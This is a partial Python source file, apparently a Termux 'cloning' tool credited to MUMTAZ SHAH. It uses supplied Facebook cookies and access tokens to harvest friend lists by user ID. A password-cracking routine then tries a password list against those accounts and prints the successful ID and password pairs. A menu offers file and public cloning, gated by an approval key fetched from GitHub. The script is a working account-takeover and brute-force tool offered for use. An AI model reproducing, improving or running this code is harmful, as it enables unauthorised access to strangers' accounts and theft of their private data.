...
def uaku():
	try:
		...
		a=requests.get('https://github.com/MR-SW4T1/SW4T1-INSIDE/blob/main/Approvaal.txt').text
		ua=open('.bbnew.txt','w')
...
def create_file_login():
    ...
    try:
        ...
        login()
    try:
        check_cookies = xyz.get('https://mbasic.facebook.com/me?access_token='+access_token,cookies=cookies).text
...
def auto_file(cookies,access_token):
    ...
    for xd in range(fl):
        ...
        try:
            fd_url = 'https://mbasic.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
            xyz = requests.Session()
...
def iamBadBoy(exid,cookies,access_token,sf):
    try:
        global total,loop
        fd_url = 'https://mbasic.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
        xyz = requests.Session()
        r = xyz.get(fd_url,cookies=cookies).text
        q = json.loads(r)
...
def manual_file(cookies,access_token):
    ...
    for xd in range(limit):
        ...
        try:
            xyz=requests.Session()
            friend_list = xyz.get('https://mbasic.facebook.com/'+idt+'?fields=friends.fields(id,name)&access_token='+access_token,cookies=cookies).text
...
def login():
    ...
    try:
        print('\n Validating cookies ... ')
        data = requests.get("https://mbasic.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [AB KHANX-OK] '+udx+' | '+pas+'\033[1;32m')
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;32m [AB KHANX-OK] '+ids+' | '+pas)
					else:
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/MR-SW4T1/SW4T1-INSIDE/blob/main/Approvaal.txt').text
  ...
  print("""\033[1;37m
    ...
    \033[1;32m   ##     ##     ######      ######
    \033[1;32m_______________________________________
\033[1;32m[-] AUTHOR    :\033[1;32m MUMTAZ SHAH
...
\033[1;93m=================================================
 \033[1;32m[*]First read NOTE:
 \033[1;32m[1]if facebook go on update you get not
 \033[1;32m[*]Ok idz we dont  responsible 
 \033[1;32m[2]you unstall termux and key need approval
================================================== 
 [*] File cloning
 [*] Create file
 [*] Public cloning
...
==================================================   """)
  ...
  try:
    httpCaht = requests.get("https://github.com/MR-SW4T1/SW4T1-INSIDE/blob/main/Approvaal.txt").text
    if id in httpCaht:
